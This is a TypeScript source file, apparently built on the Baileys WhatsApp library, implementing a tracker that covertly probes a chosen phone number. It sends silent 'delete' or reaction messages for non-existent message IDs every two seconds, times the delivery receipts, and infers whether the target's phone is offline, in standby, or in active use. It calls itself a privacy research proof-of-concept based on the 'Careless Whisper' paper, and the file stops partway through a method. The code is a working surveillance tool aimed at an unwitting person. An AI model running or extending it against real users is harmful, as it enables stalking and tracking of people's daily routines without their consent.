import '@whiskeysockets/baileys';
import { WASocket, proto, jidNormalizedUser } from '@whiskeysockets/baileys';
import { pino } from 'pino';

// Suppress Baileys debug output (Closing session spam)
const logger = pino({
    level: process.argv.includes('--debug') ? 'debug' : 'silent'
});

/**
 * Probe method types
 * - 'delete': Silent delete probe (sends delete request for non-existent message) - DEFAULT
 * - 'reaction': Reaction probe (sends reaction to non-existent message)
 */
export type ProbeMethod = 'delete' | 'reaction';

/**
 * Device state enumeration
 */
enum DeviceState {
    OFFLINE = 'OFFLINE',
    APP_FOREGROUND = 'App Active',
    APP_MINIMIZED = 'App Minimized',
    SCREEN_ON = 'Screen On (Idle)',
    SCREEN_OFF = 'Standby',
    CALIBRATING = 'Calibrating...'
}

/**
 * State thresholds combining absolute and network-adjusted values
 */
interface StateThresholds {
    // Absolute thresholds from research (baseline)
    absolute: {
        veryActive: number;    // App in foreground
        minimized: number;     // App minimized but screen on
        screenOn: number;      // Screen on, app background
        screenOff: number;     // Screen off / deep standby
    };
    // Network-adjusted thresholds (absolute + network baseline)
    adjusted: {
        veryActive: number;
        minimized: number;
        screenOn: number;
        screenOff: number;
    };
    // Percentile-based boundaries (for sanity checks)
    percentiles: {
        p25: number;
        p50: number;
        p75: number;
        p90: number;
    };
}

/**
 * Calibration state tracking
 */
interface CalibrationState {
    samplesCollected: number;
    requiredSamples: number;       // 300 minimum
    networkBaseline: number;        // Median of first 100 samples
    isCalibrated: boolean;
    calibrationStartedAt: number;
}

/**
 * Temporal pattern detection for transition ramps
 */
interface TemporalPattern {
    windowSize: number;             // 30 seconds
    samples: Array<{rtt: number; timestamp: number}>;
    trendDirection: 'rising' | 'falling' | 'stable';
    transitionDetected: boolean;
}

/**
 * State hysteresis to prevent flapping
 */
interface StateHysteresis {
    currentState: string;
    stateEnteredAt: number;
    minimumStateDuration: number;   // 10 seconds
    transitionMargin: number;       // Must cross threshold by 20% margin
}

/**
 * Per-state sample tracking
 */
interface StateStatistics {
    state: string;
    sampleCount: number;
    avgRTT: number;
    minRTT: number;
    maxRTT: number;
    firstSeen: number;
    lastSeen: number;
}

/**
 * Logger utility for debug and normal mode
 */
class TrackerLogger {
    private isDebugMode: boolean;

    constructor(debugMode: boolean = false) {
        this.isDebugMode = debugMode;
    }

    setDebugMode(enabled: boolean) {
        this.isDebugMode = enabled;
    }

    debug(...args: any[]) {
        if (this.isDebugMode) {
            console.log(...args);
        }
    }

    info(...args: any[]) {
        console.log(...args);
    }

    formatDeviceState(jid: string, rtt: number, avgRtt: number, median: number, threshold: number, state: string) {
        const stateColor = state === 'Online' ? '🟢' : state === 'Standby' ? '🟡' : state === 'OFFLINE' ? '🔴' : '⚪';
        const timestamp = new Date().toLocaleTimeString('de-DE');

        // Box width is 64 characters, inner content is 62 characters (excluding ║ on both sides)
        const boxWidth = 62;

        const header = `${stateColor} Device Status Update - ${timestamp}`;
        const jidLine = `JID:        ${jid}`;
        const statusLine = `Status:     ${state}`;
        const rttLine = `RTT:        ${rtt}ms`;
        const avgLine = `Avg (3):    ${avgRtt.toFixed(0)}ms`;
        const medianLine = `Median:     ${median.toFixed(0)}ms`;
        const thresholdLine = `Threshold:  ${threshold.toFixed(0)}ms`;

        console.log(`\n╔════════════════════════════════════════════════════════════════╗`);
        console.log(`║ ${header.padEnd(boxWidth)} ║`);
        console.log(`╠════════════════════════════════════════════════════════════════╣`);
        console.log(`║ ${jidLine.padEnd(boxWidth)} ║`);
        console.log(`║ ${statusLine.padEnd(boxWidth)} ║`);
        console.log(`║ ${rttLine.padEnd(boxWidth)} ║`);
        console.log(`║ ${avgLine.padEnd(boxWidth)} ║`);
        console.log(`║ ${medianLine.padEnd(boxWidth)} ║`);
        console.log(`║ ${thresholdLine.padEnd(boxWidth)} ║`);
        console.log(`╚════════════════════════════════════════════════════════════════╝\n`);
    }
}

const trackerLogger = new TrackerLogger();

/**
 * Metrics tracked per device for activity monitoring
 */
interface DeviceMetrics {
    rttHistory: number[];      // Historical RTT measurements (up to 2000)
    recentRtts: number[];      // Recent RTTs for exponential moving average (last 10)
    state: string;             // Current device state (Active/Online/Standby/Calibrating/Offline)
    lastRtt: number;           // Most recent RTT measurement
    lastUpdate: number;        // Timestamp of last update
    ema: number;               // Exponential moving average for smoother detection
    stateChangedAt: number;    // Timestamp when state last changed (for hysteresis)
    stateHistory: Array<{state: string, timestamp: number, rtt: number}>; // Historical states
    baselineP25: number;       // 25th percentile (very active)
    baselineP50: number;       // 50th percentile (median)
    baselineP75: number;       // 75th percentile (standby threshold)
    baselineP90: number;       // 90th percentile (deep standby)
    // New fields for improved accuracy
    calibration: CalibrationState;       // Calibration state
    thresholds: StateThresholds;         // Hybrid thresholds
    temporalPattern: TemporalPattern;    // Temporal pattern detection
    stateStats: Map<string, StateStatistics>;  // Per-state statistics
}

/**
 * WhatsAppTracker - Monitors messaging app user activity using RTT-based analysis
 *
 * This class implements a privacy research proof-of-concept that demonstrates
 * how messaging apps can leak user activity information through network timing.
 *
 * The tracker sends probe messages and measures Round-Trip Time (RTT) to detect
 * when a user's device is actively in use vs. in standby mode.
 *
 * Works with WhatsApp, Signal, and similar messaging platforms.
 *
 * Based on research: "Careless Whisper: Exploiting Silent Delivery Receipts to Monitor Users"
 * by Gegenhuber et al., University of Vienna & SBA Research
 */
export class WhatsAppTracker {
    private sock: WASocket;
    private targetJid: string;
    private trackedJids: Set<string> = new Set(); // Multi-device support
    private isTracking: boolean = false;
    private deviceMetrics: Map<string, DeviceMetrics> = new Map();
    private globalRttHistory: number[] = []; // For threshold calculation
    private probeStartTimes: Map<string, number> = new Map();
    private probeTimeouts: Map<string, NodeJS.Timeout> = new Map();
    private lastPresence: string | null = null;
    private probeMethod: ProbeMethod = 'delete'; // Default to delete method
    public onUpdate?: (data: any) => void;

    constructor(sock: WASocket, targetJid: string, debugMode: boolean = false) {
        this.sock = sock;
        this.targetJid = targetJid;
        this.trackedJids.add(targetJid);
        trackerLogger.setDebugMode(debugMode);
    }

    public setProbeMethod(method: ProbeMethod) {
        this.probeMethod = method;
        trackerLogger.info(`\n🔄 Probe method changed to: ${method === 'delete' ? 'Silent Delete' : 'Reaction'}\n`);
    }

    public getProbeMethod(): ProbeMethod {
        return this.probeMethod;
    }

    /**
     * Start tracking the target user's activity
     * Sets up event listeners for message receipts and presence updates
     */
    public async startTracking() {
        if (this.isTracking) return;
        this.isTracking = true;
        trackerLogger.info(`\n✅ Tracking started for ${this.targetJid}`);
        trackerLogger.info(`Probe method: ${this.probeMethod === 'delete' ? 'Silent Delete (covert)' : 'Reaction'}\n`);

        // Listen for message updates (receipts)
        this.sock.ev.on('messages.update', (updates) => {
            for (const update of updates) {
                // Check if update is from any of the tracked JIDs (multi-device support)
                if (update.key.remoteJid && this.trackedJids.has(update.key.remoteJid) && update.key.fromMe) {
                    this.analyzeUpdate(update);
                }
            }
        });

        // Listen for raw receipts to catch 'inactive' type which are ignored by Baileys
        this.sock.ws.on('CB:receipt', (node: any) => {
            this.handleRawReceipt(node);
        });

        // Listen for presence updates
        this.sock.ev.on('presence.update', (update) => {
            trackerLogger.debug('[PRESENCE] Raw update received:', JSON.stringify(update, null, 2));

            if (update.presences) {
                for (const [jid, presenceData] of Object.entries(update.presences)) {
                    if (presenceData && presenceData.lastKnownPresence) {
                        // Track multi-device JIDs (including LID)
                        this.trackedJids.add(jid);
                        trackerLogger.debug(`[MULTI-DEVICE] Added JID to tracking: ${jid}`);

                        this.lastPresence = presenceData.lastKnownPresence;
                        trackerLogger.debug(`[PRESENCE] Stored presence from ${jid}: ${this.lastPresence}`);
                        break;
                    }
                }
            }
        });

        // Subscribe to presence updates
        try {
            await this.sock.presenceSubscribe(this.targetJid);
            trackerLogger.debug(`[PRESENCE] Successfully subscribed to presence for ${this.targetJid}`);
            trackerLogger.debug(`[MULTI-DEVICE] Currently tracking JIDs: ${Array.from(this.trackedJids).join(', ')}`);
        } catch (err) {
            trackerLogger.debug('[PRESENCE] Error subscribing to presence:', err);
        }

        // Send initial state update
        if (this.onUpdate) {
            this.onUpdate({
                devices: [],
                deviceCount: this.trackedJids.size,
                presence: this.lastPresence,
                median: 0,
                threshold: 0
            });
        }

        // Start the probe loop
        this.probeLoop();
    }

    private async probeLoop() {
        while (this.isTracking) {
            try {
                await this.sendProbe();
            } catch (err) {
                logger.error(err, 'Error sending probe');
            }
            const delay = Math.floor(Math.random() * 100) + 2000;
            await new Promise(resolve => setTimeout(resolve, delay));
        }
    }

    private async sendProbe() {
        if (this.probeMethod === 'delete') {
            await this.sendDeleteProbe();
        } else {
            await this.sendReactionProbe();
        }
    }

    /**
     * Send a delete probe - completely silent/covert method
     * Sends a "delete" command for a non-existent message
     */
    private async sendDeleteProbe() {
        try {
            // Generate a random message ID that likely doesn't exist
            const prefixes = ['3EB0', 'BAE5', 'F1D2', 'A9C4', '7E8B', 'C3F9', '2D6A'];
            const randomPrefix = prefixes[Math.floor(Math.random() * prefixes.length)];
            const randomSuffix = Math.random().toString(36).substring(2, 10).toUpperCase();
            const randomMsgId = randomPrefix + randomSuffix;
            
            const randomDeleteMessage = {
                delete:{
                    remoteJid: this.targetJid,
                    fromMe: true,
                    id: randomMsgId,
                }
            };

            trackerLogger.debug(
                `[PROBE-DELETE] Sending silent delete probe for fake message ${randomMsgId}`
            );
            const startTime = Date.now();
            
            const result = await this.sock.sendMessage(this.targetJid, randomDeleteMessage);

            if (result?.key?.id) {
                trackerLogger.debug(`[PROBE-DELETE] Delete probe sent successfully, message ID: ${result.key.id}`);
                this.probeStartTimes.set(result.key.id, startTime);

                // Set timeout: if no CLIENT ACK within 10 seconds, mark device as OFFLINE
                const timeoutId = setTimeout(() => {
                    if (this.probeStartTimes.has(result.key.id!)) {
                        const elapsedTime = Date.now() - startTime;
                        trackerLogger.debug(`[PROBE-DELETE TIMEOUT] No CLIENT ACK for ${result.key.id} after ${elapsedTime}ms - Device is OFFLINE`);
                        this.probeStartTimes.delete(result.key.id!);
                        this.probeTimeouts.delete(result.key.id!);

                        // Mark device as OFFLINE due to no response
                        if (result.key.remoteJid) {
                            this.markDeviceOffline(result.key.remoteJid, elapsedTime);
                        }
                    }
                }, 10000); // 10 seconds timeout

                this.probeTimeouts.set(result.key.id, timeoutId);
            } else {
                trackerLogger.debug('[PROBE-DELETE ERROR] Failed to get message ID from send result');
            }
        } catch (err) {
            logger.error(err, '[PROBE-DELETE ERROR] Failed to send delete probe message');
        }
    }

    /**
     * Send a reaction probe - original method
     * Uses a reaction to a non-existent message to minimize user disruption
     */
    private async sendReactionProbe() {
        try {
            // Generate a random message ID that likely doesn't exist
            const prefixes = ['3EB0', 'BAE5', 'F1D2', 'A9C4', '7E8B', 'C3F9', '2D6A'];
            const randomPrefix = prefixes[Math.floor(Math.random() * prefixes.length)];
            const randomSuffix = Math.random().toString(36).substring(2, 10).toUpperCase();
            const randomMsgId = randomPrefix + randomSuffix;

            // Randomize reaction emoji
            const reactions = ['👍', '❤️', '😂', '😮', '😢', '🙏', '👻', '🔥', '✨', ''];
            const randomReaction = reactions[Math.floor(Math.random() * reactions.length)];

            const reactionMessage = {
                react: {
                    text: randomReaction,
                    key: {
                        remoteJid: this.targetJid,
                        fromMe: false,
                        id: randomMsgId
                    }
                }
            };

            trackerLogger.debug(`[PROBE-REACTION] Sending probe with reaction "${randomReaction}" to non-existent message ${randomMsgId}`);
            const result = await this.sock.sendMessage(this.targetJid, reactionMessage);
            const startTime = Date.now();

            if (result?.key?.id) {
                trackerLogger.debug(`[PROBE-REACTION] Probe sent successfully, message ID: ${result.key.id}`);
                this.probeStartTimes.set(result.key.id, startTime);

                // Set timeout: if no CLIENT ACK within 10 seconds, mark device as OFFLINE
                const timeoutId = setTimeout(() => {
                    if (this.probeStartTimes.has(result.key.id!)) {
                        const elapsedTime = Date.now() - startTime;
                        trackerLogger.debug(`[PROBE-REACTION TIMEOUT] No CLIENT ACK for ${result.key.id} after ${elapsedTime}ms - Device is OFFLINE`);
                        this.probeStartTimes.delete(result.key.id!);
                        this.probeTimeouts.delete(result.key.id!);

                        // Mark device as OFFLINE due to no response
                        if (result.key.remoteJid) {
                            this.markDeviceOffline(result.key.remoteJid, elapsedTime);
                        }
                    }
                }, 10000); // 10 seconds timeout

                this.probeTimeouts.set(result.key.id, timeoutId);
            } else {
                trackerLogger.debug('[PROBE-REACTION ERROR] Failed to get message ID from send result');
            }
        } catch (err) {
            logger.error(err, '[PROBE-REACTION ERROR] Failed to send probe message');
        }
    }

    /**
     * Handle raw receipt nodes directly from the websocket
     * This is necessary because Baileys ignores receipts with type="inactive"
     */
    private handleRawReceipt(node: any) {
        try {
            const { attrs } = node;
            // We only care about 'inactive' receipts here
            if (attrs.type === 'inactive') {
                trackerLogger.debug(`[RAW RECEIPT] Received inactive receipt: ${JSON.stringify(attrs)}`);

                const msgId = attrs.id;
                const fromJid = attrs.from;

                // Guard against missing from attribute
                if (!fromJid) {
                    trackerLogger.debug('[RAW RECEIPT] Missing from JID in receipt');
                    return;
                }

                // Extract base number from device JID (e.g., "15109129852:22@s.whatsapp.net" -> "15109129852")
                const baseNumber = fromJid.split('@')[0].split(':')[0];

                // Check if this matches our target (with or without device ID)
                const isTracked = this.trackedJids.has(fromJid) ||
                                  this.trackedJids.has(`${baseNumber}@s.whatsapp.net`);

                if (isTracked) {
                    this.processAck(msgId, fromJid, 'inactive');
                }
            }
        } catch (err) {
            trackerLogger.debug(`[RAW RECEIPT] Error handling receipt: ${err}`);
        }
    }

    /**
     * Process an ACK (receipt) from a device
     */
    private processAck(msgId: string, fromJid: string, type: string) {
        trackerLogger.debug(`[ACK PROCESS] ID: ${msgId}, JID: ${fromJid}, Type: ${type}`);

        if (!msgId || !fromJid) return;

        // Check if this is one of our probes
        const startTime = this.probeStartTimes.get(msgId);

        if (startTime) {
            const rtt = Date.now() - startTime;
            trackerLogger.debug(`[TRACKING] ✅ ${type.toUpperCase()} received for ${msgId} from ${fromJid}, RTT: ${rtt}ms`);

            // Clear timeout
            const timeoutId = this.probeTimeouts.get(msgId);
            if (timeoutId) {
                clearTimeout(timeoutId);
                this.probeTimeouts.delete(msgId);
            }

            this.probeStartTimes.delete(msgId);
            this.addMeasurementForDevice(fromJid, rtt);
        }
    }

    /**
     * Analyze message update and calculate RTT
     * @param update Message update from WhatsApp
     */
    private analyzeUpdate(update: { key: proto.IMessageKey, update: Partial<proto.IWebMessageInfo> }) {
        const status = update.update.status;
        const msgId = update.key.id;
        const fromJid = update.key.remoteJid;

        if (!msgId || !fromJid) return;

        trackerLogger.debug(`[TRACKING] Message Update - ID: ${msgId}, JID: ${fromJid}, Status: ${status} (${this.getStatusName(status)})`);

        // Only CLIENT ACK (3) means device is online and received the message
        // SERVER ACK (2) only means server received it, not the device
        if (status === 3) { // CLIENT ACK
            this.processAck(msgId, fromJid, 'client_ack');
        }
    }

    private getStatusName(status: number | null | undefined): string {
        switch (status) {
            case 0: return 'ERROR';
            case 1: return 'PENDING';
            case 2: return 'SERVER_ACK';
            case 3: return 'DELIVERY_ACK';
            case 4: return 'READ';
            case 5: return 'PLAYED';
            default: return 'UNKNOWN';
        }
    }

    /**
     * Mark a device as OFFLINE when no CLIENT ACK is received
     * @param jid Device JID
     * @param timeout Time elapsed before timeout
     */
    private markDeviceOffline(jid: string, timeout: number) {
        // Initialize device metrics if not exists
        if (!this.deviceMetrics.has(jid)) {
            this.deviceMetrics.set(jid, {
                rttHistory: [],
                recentRtts: [],
                state: 'OFFLINE',
                lastRtt: timeout,
                lastUpdate: Date.now(),
                ema: 0,
                stateChangedAt: Date.now(),
                stateHistory: [{state: 'OFFLINE', timestamp: Date.now(), rtt: timeout}],
                baselineP25: 0,
                baselineP50: 0,
                baselineP75: 0,
                baselineP90: 0,
                // New fields
                calibration: this.initializeCalibration(),
                thresholds: this.initializeThresholds(),
                temporalPattern: this.initializeTemporalPattern(),
                stateStats: new Map<string, StateStatistics>()
            });
        } else {
            const metrics = this.deviceMetrics.get(jid)!;
            if (metrics.state !== 'OFFLINE') {
                metrics.stateHistory.push({state: 'OFFLINE', timestamp: Date.now(), rtt: timeout});
                metrics.stateChangedAt = Date.now();
            }
            metrics.state = 'OFFLINE';
            metrics.lastRtt = timeout;
            metrics.lastUpdate = Date.now();
        }

        trackerLogger.info(`\n🔴 Device ${jid} marked as OFFLINE (no CLIENT ACK after ${timeout}ms)\n`);
        this.sendUpdate();
    }

    /**
     * Add RTT measurement for a specific device and update its state
     * @param jid Device JID
     * @param rtt Round-trip time in milliseconds
     */
    private addMeasurementForDevice(jid: string, rtt: number) {
        // Initialize device metrics if not exists
        if (!this.deviceMetrics.has(jid)) {
            this.deviceMetrics.set(jid, {
                rttHistory: [],
                recentRtts: [],
                state: DeviceState.CALIBRATING,
                lastRtt: rtt,
                lastUpdate: Date.now(),
                ema: rtt, // Initialize EMA with first value
                stateChangedAt: Date.now(),
                stateHistory: [{state: DeviceState.CALIBRATING, timestamp: Date.now(), rtt: rtt}],
                baselineP25: 0,
                baselineP50: 0,
                baselineP75: 0,
                baselineP90: 0,
                // New fields
                calibration: this.initializeCalibration(),
                thresholds: this.initializeThresholds(),
                temporalPattern: this.initializeTemporalPattern(),
                stateStats: new Map<string, StateStatistics>()
            });
        }

        const metrics = this.deviceMetrics.get(jid)!;

        // Only add measurements if we actually received a CLIENT ACK (rtt <= 5000ms)
        if (rtt <= 5000) {
            // Filter outliers using MAD (Median Absolute Deviation) before adding
            const isOutlier = this.isOutlier(rtt, metrics.rttHistory);

            if (!isOutlier || metrics.rttHistory.length < 10) {
                // 1. Add to device's recent RTTs (last 10 for better smoothing)
                metrics.recentRtts.push(rtt);
                if (metrics.recentRtts.length > 10) {
                    metrics.recentRtts.shift();
                }

                // 2. Update EMA (Exponential Moving Average) - more weight on recent data
                const alpha = 0.3; // Smoothing factor (0.3 = 30% weight on new value)
                metrics.ema = alpha * rtt + (1 - alpha) * metrics.ema;

                // 3. Add to device's history for calibration (last 2000)
                metrics.rttHistory.push(rtt);
                if (metrics.rttHistory.length > 2000) {
                    metrics.rttHistory.shift();
                }

                // 4. Update calibration state
                metrics.calibration.samplesCollected = metrics.rttHistory.length;

                // Calculate network baseline after 100 samples
                if (metrics.calibration.samplesCollected === 100) {
                    metrics.calibration.networkBaseline = this.calculateNetworkBaseline(metrics.rttHistory);
                    this.updateAdjustedThresholds(metrics.thresholds, metrics.calibration.networkBaseline);
                    trackerLogger.debug(
                        `[CALIBRATION] ${jid}: Network baseline calculated: ${metrics.calibration.networkBaseline.toFixed(0)}ms`
                    );
                }

                // Mark as calibrated after 300 samples
                if (metrics.calibration.samplesCollected >= metrics.calibration.requiredSamples && !metrics.calibration.isCalibrated) {
                    metrics.calibration.isCalibrated = true;
                    trackerLogger.info(
                        `\n✅ Device ${jid} calibration complete (${metrics.calibration.samplesCollected} samples, ` +
                        `baseline: ${metrics.calibration.networkBaseline.toFixed(0)}ms)\n`
                    );
                }

                // 5. Update temporal pattern
                this.updateTemporalPattern(metrics.temporalPattern, rtt, Date.now());
            } else {
                trackerLogger.debug(`[OUTLIER FILTERED] RTT ${rtt}ms for ${jid} - likely network spike`);
            }

            // 6. Add to global history for global threshold calculation
            this.globalRttHistory.push(rtt);
            if (this.globalRttHistory.length > 2000) {
                this.globalRttHistory.shift();
            }

            metrics.lastRtt = rtt;
            metrics.lastUpdate = Date.now();

            // Determine new state based on RTT
            this.determineDeviceState(jid);
        }
        // If rtt > 5000ms, it means timeout - device is already marked as OFFLINE by markDeviceOffline()

        this.sendUpdate();
    }

    /**
     * Initialize thresholds with absolute values from research
     */
    private initializeThresholds(): StateThresholds {
        return {
            absolute: {
                veryActive: 350,    // App in foreground (~350ms RTT from research)
                minimized: 500,     // App minimized (~500ms RTT)
                screenOn: 1000,     // Screen on, app background (~1000ms RTT)
                screenOff: 1500     // Screen off (>1000ms RTT, using 1500ms as threshold)
            },
            adjusted: {
                veryActive: 350,    // Will be updated after network baseline calculation
                minimized: 500,
                screenOn: 1000,
                screenOff: 1500
            },
            percentiles: {
                p25: 0,
                p50: 0,
                p75: 0,
                p90: 0
            }
        };
    }

    /**
     * Initialize calibration state
     */
    private initializeCalibration(): CalibrationState {
        return {
            samplesCollected: 0,
            requiredSamples: 300,        // 300 samples minimum for calibration
            networkBaseline: 0,           // Will be calculated from first 100 samples
            isCalibrated: false,
            calibrationStartedAt: Date.now()
        };
    }

    /**
     * Initialize temporal pattern tracking
     */
    private initializeTemporalPattern(): TemporalPattern {
        return {
            windowSize: 30000,            // 30 seconds in milliseconds
            samples: [],
            trendDirection: 'stable',
            transitionDetected: false
        };
    }

    /**
     * Calculate network baseline from first 100 RTT samples
     * @param rttHistory Array of RTT measurements
     * @returns Network baseline (median of first 100 samples)
     */
    private calculateNetworkBaseline(rttHistory: number[]): number {
        if (rttHistory.length < 100) return 0;

        // Take first 100 samples
        const firstSamples = rttHistory.slice(0, 100);
        return this.calculateMedian(firstSamples);
    }

    /**
     * Update adjusted thresholds based on network baseline
     * @param thresholds StateThresholds object to update
     * @param networkBaseline Network baseline RTT
     */
    private updateAdjustedThresholds(thresholds: StateThresholds, networkBaseline: number) {
        // Don't adjust if baseline is unreasonably high (network issues during calibration)
        const adjustment = networkBaseline > 500 ? 0 : networkBaseline;

        thresholds.adjusted.veryActive = thresholds.absolute.veryActive + adjustment;
        thresholds.adjusted.minimized = thresholds.absolute.minimized + adjustment;
        thresholds.adjusted.screenOn = thresholds.absolute.screenOn + adjustment;
        thresholds.adjusted.screenOff = thresholds.absolute.screenOff + adjustment;
    }

    /**
     * Update temporal pattern with new RTT sample
     * @param pattern TemporalPattern to update
     * @param rtt New RTT measurement
     * @param timestamp Timestamp of measurement
     */
    private updateTemporalPattern(pattern: TemporalPattern, rtt: number, timestamp: number) {
        // Add new sample
        pattern.samples.push({ rtt, timestamp });

        // Remove samples older than window size
        const cutoffTime = timestamp - pattern.windowSize;
        pattern.samples = pattern.samples.filter(s => s.timestamp >= cutoffTime);

        // Detect trend if we have enough samples (at least 10 samples over 30 seconds)
        if (pattern.samples.length >= 10) {
            const trend = this.detectTrend(pattern.samples);
            pattern.trendDirection = trend.direction;
            pattern.transitionDetected = trend.isTransition;
        }
    }

    /**
     * Detect trend in temporal pattern using linear regression
     * @param samples Array of RTT samples with timestamps
     * @returns Trend information
     */
    private detectTrend(samples: Array<{rtt: number; timestamp: number}>): {
        direction: 'rising' | 'falling' | 'stable';
        isTransition: boolean;
    } {
        if (samples.length < 10) {
            return { direction: 'stable', isTransition: false };
        }

        // Simple linear regression to calculate slope
        const n = samples.length;
        let sumX = 0, sumY = 0, sumXY = 0, sumXX = 0;

        // Use relative timestamps (0, 1, 2, ...) for X axis
        samples.forEach((sample, i) => {
            sumX += i;
            sumY += sample.rtt;
            sumXY += i * sample.rtt;
            sumXX += i * i;
        });

        const slope = (n * sumXY - sumX * sumY) / (n * sumXX - sumX * sumX);

        // Determine trend direction
        // Rising: slope > 10ms per sample (significant increase)
        // Falling: slope < -10ms per sample (significant decrease)
        const direction: 'rising' | 'falling' | 'stable' =
            slope > 10 ? 'rising' :
            slope < -10 ? 'falling' :
            'stable';

        // Transition detected if rising significantly (app going to background)
        // Threshold: RTT increase of > 200ms over 30 seconds
        const firstRTT = samples[0].rtt;
        const lastRTT = samples[samples.length - 1].rtt;
        const rttChange = lastRTT - firstRTT;
        const isTransition = direction === 'rising' && rttChange > 200;

        return { direction, isTransition };
    }

    /**
     * Detect outliers using MAD (Median Absolute Deviation) - more robust than standard deviation
     * @param value The value to check
     * @param history Array of historical values
     * @returns true if the value is an outlier
     */
    private isOutlier(value: number, history: number[]): boolean {
        if (history.length < 10) return false; // Need enough data

        const median = this.calculateMedian(history);
        const deviations = history.map(val => Math.abs(val - median));
        const mad = this.calculateMedian(deviations);

        // Modified Z-score using MAD
        // UPDATED: Value is outlier only if modified z-score > 10 AND value > 5000ms
        // This prevents filtering legitimate state changes while still catching extreme network glitches
        const modifiedZScore = 0.6745 * (value - median) / (mad + 0.0001); // Add small value to avoid division by zero

        return Math.abs(modifiedZScore) > 10 && value > 5000;
    }

    /**
     * Calculate median of an array
     */
    private calculateMedian(arr: number[]): number {
        if (arr.length === 0) return 0;
        const sorted = [...arr].sort((a, b) => a - b);
        const mid = Math.floor(sorted.length / 2);
        return sorted.length % 2 !== 0 ? sorted[mid] : (sorted[mid - 1] + sorted[mid]) / 2;
    }

    /**
     * Calculate percentile of an array
     */
    private calculatePercentile(arr: number[], percentile: number): number {
        if (arr.length === 0) return 0;
        const sorted = [...arr].sort((a, b) => a - b);
        const index = (percentile / 100) * (sorted.length - 1);
        const lower = Math.floor(index);
        const upper = Math.ceil(index);
        const weight = index - lower;
        return sorted[lower] * (1 - weight) + sorted[upper] * weight;
    }

    /**
     * Update baseline percentiles for device-specific thresholds
     */
    private updateBaselines(metrics: DeviceMetrics) {
        if (metrics.rttHistory.length < 20) return; // Need minimum samples

        metrics.baselineP25 = this.calculatePercentile(metrics.rttHistory, 25);
        metrics.baselineP50 = this.calculatePercentile(metrics.rttHistory, 50);
        metrics.baselineP75 = this.calculatePercentile(metrics.rttHistory, 75);
        metrics.baselineP90 = this.calculatePercentile(metrics.rttHistory, 90);
    }

    /**
     * Determine device state based on absolute RTT thresholds and temporal patterns
     * @param jid Device JID
     */
    private determineDeviceState(jid: string) {
        const metrics = this.deviceMetrics.get(jid);
        if (!metrics) return;

        // 1. Check for OFFLINE state
        // If device is marked as OFFLINE (no CLIENT ACK received), keep that state
        // Only change back to active states if we receive new measurements
        if (metrics.state === DeviceState.OFFLINE) {
            // Check if this is a new measurement (device came back online)
            if (metrics.lastRtt <= 5000 && metrics.recentRtts.length > 0) {
                trackerLogger.debug(`[DEVICE ${jid}] Device came back online (RTT: ${metrics.lastRtt}ms)`);
                // Continue with normal state determination below
            } else {
                trackerLogger.debug(`[DEVICE ${jid}] Maintaining OFFLINE state`);
                return;
            }
        }

        // 2. Check calibration state - need 300 samples for reliable classification
        if (!metrics.calibration.isCalibrated) {
            const progress = metrics.calibration.samplesCollected;
            const required = metrics.calibration.requiredSamples;
            metrics.state = `${DeviceState.CALIBRATING} (${progress}/${required})`;
            trackerLogger.debug(`[DEVICE ${jid}] Still calibrating: ${progress}/${required} samples`);
            return;
        }

        // 3. Update device-specific baseline percentiles (for reference/validation)
        this.updateBaselines(metrics);

        // 4. Use EMA (Exponential Moving Average) for smoother classification
        const currentRTT = metrics.ema;

        // 5. HYSTERESIS: Prevent rapid state flipping
        // State must be stable for at least 10 seconds before changing
        const MIN_STATE_DURATION = 10000; // 10 seconds
        const timeSinceStateChange = Date.now() - metrics.stateChangedAt;
        const canChangeState = timeSinceStateChange > MIN_STATE_DURATION;

        // 6. Determine new state using ABSOLUTE THRESHOLDS with 20% hysteresis margin
        let newState: string;
        const thresholds = metrics.thresholds.adjusted;
        const MARGIN = 1.2; // 20% margin to prevent bouncing at boundaries

        // 7. Check for temporal transition patterns first
        if (metrics.temporalPattern.transitionDetected && metrics.temporalPattern.trendDirection === 'rising') {
            // App is transitioning to background (rising RTT over 30 seconds)
            newState = DeviceState.APP_MINIMIZED;
            trackerLogger.debug(`[TEMPORAL TRANSITION] ${jid}: Detected app going to background`);
        }
        // 8. Use absolute thresholds adjusted for network baseline
        else if (currentRTT < thresholds.veryActive * MARGIN) {
            newState = DeviceState.APP_FOREGROUND;
        } else if (currentRTT < thresholds.screenOn * MARGIN) {
            newState = DeviceState.APP_MINIMIZED;
        } else if (currentRTT < thresholds.screenOff * MARGIN) {
            newState = DeviceState.SCREEN_ON;
        } else {
            newState = DeviceState.SCREEN_OFF;
        }

        // 9. Apply hysteresis - only change state if enough time has passed
        if (newState !== metrics.state && canChangeState) {
            trackerLogger.debug(
                `[STATE CHANGE] ${jid}: ${metrics.state} -> ${newState} ` +
                `(RTT: ${currentRTT.toFixed(0)}ms, Thresholds - Active: ${thresholds.veryActive.toFixed(0)}ms, ` +
                `Minimized: ${thresholds.minimized.toFixed(0)}ms, ScreenOn: ${thresholds.screenOn.toFixed(0)}ms, ` +
                `ScreenOff: ${thresholds.screenOff.toFixed(0)}ms)`
            );

            // Record state change in history
            metrics.stateHistory.push({
                state: newState,
                timestamp: Date.now(),
                rtt: metrics.lastRtt
            });

            // Keep only last 1000 state changes
            if (metrics.stateHistory.length > 1000) {
                metrics.stateHistory.shift();
            }

            metrics.state = newState;
            metrics.stateChangedAt = Date.now();
        } else if (newState !== metrics.state) {
            trackerLogger.debug(
                `[HYSTERESIS] ${jid}: Delaying state change ${metrics.state} -> ${newState} ` +
                `(${(MIN_STATE_DURATION - timeSinceStateChange) / 1000}s remaining)`
            );
        }

        // 10. Output formatted status
        const movingAvg = metrics.recentRtts.reduce((a, b) => a + b, 0) / metrics.recentRtts.length;
        const globalMedian = this.calculateGlobalMedian();
        const globalThreshold = globalMedian * 0.9;
        trackerLogger.formatDeviceState(jid, metrics.lastRtt, movingAvg, globalMedian, globalThreshold, metrics.state);

        // Debug mode: Additional debug information
        trackerLogger.debug(
            `[ADVANCED METRICS] ${jid}: ` +
            `EMA: ${metrics.ema.toFixed(0)}ms, ` +
            `Network Baseline: ${metrics.calibration.networkBaseline.toFixed(0)}ms, ` +
            `Adjusted Thresholds - Active: ${thresholds.veryActive.toFixed(0)}ms, ` +
            `Minimized: ${thresholds.minimized.toFixed(0)}ms, ` +
            `ScreenOn: ${thresholds.screenOn.toFixed(0)}ms, ` +
            `ScreenOff: ${thresholds.screenOff.toFixed(0)}ms, ` +
            `Temporal: ${metrics.temporalPattern.trendDirection}, ` +
            `History: ${metrics.rttHistory.length}, ` +
            `States recorded: ${metrics.stateHistory.length}`
        );
    }

    /**
     * Send update to client with current tracking data
     */
    private sendUpdate() {
